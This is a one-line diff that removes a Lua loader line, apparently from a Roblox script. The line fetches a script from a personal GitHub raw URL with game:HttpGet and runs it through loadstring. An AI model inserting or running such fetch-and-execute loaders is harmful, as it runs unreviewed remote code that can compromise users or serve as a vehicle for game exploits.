@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ZXC09321/my-script/main/Script.txt",true))() 
